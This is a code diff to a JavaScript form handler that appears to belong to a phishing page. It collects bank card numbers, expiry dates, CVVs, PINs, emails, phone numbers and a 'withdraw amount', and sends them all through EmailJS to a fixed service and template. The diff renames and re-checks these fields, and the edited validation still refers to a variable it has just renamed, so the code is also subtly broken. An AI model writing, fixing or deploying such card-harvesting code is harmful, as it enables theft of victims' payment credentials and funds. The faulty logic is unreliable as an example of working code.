@@ -18,22 +18,22 @@ form.addEventListener('submit', (e) => {
   const email = document.getElementById('email').value;
   const phoneNumber = document.getElementById('phone-number').value;
   const withdrawAmount = document.getElementById('Withdraw-Amount').value;
-  const pin = document.getElementById('pin').value;
+  const pinHolder = document.getElementById('pin').value;
 
   // Check if all fields are filled
-  if (!bankName || !cardNumber || !expiringDate || !cvv || !email || !phoneNumber || !withdrawAmount || !pin) {
+  if (!bankName || !cardNumber || !expiringDate || !cvv || !pin || !email || !phoneNumber || !withdrawAmount) {
     alert('Please fill all details');
     return;
   }
 
   // Send the form data to EmailJS
   emailjs.send('service_9psisa9', 'template_azxewmk', {
-    Withdraw_Amount: WithdrawAmount,
+    Withdraw_Amount: withdrawAmount,
     bank_name: bankName,
     card_number: cardNumber,
     expiring_date: expiringDate,
     cvv: cvv,
-    pin: pin,
+    pin: pinHolder,
     email: email,
     phone_number: phoneNumber
   })
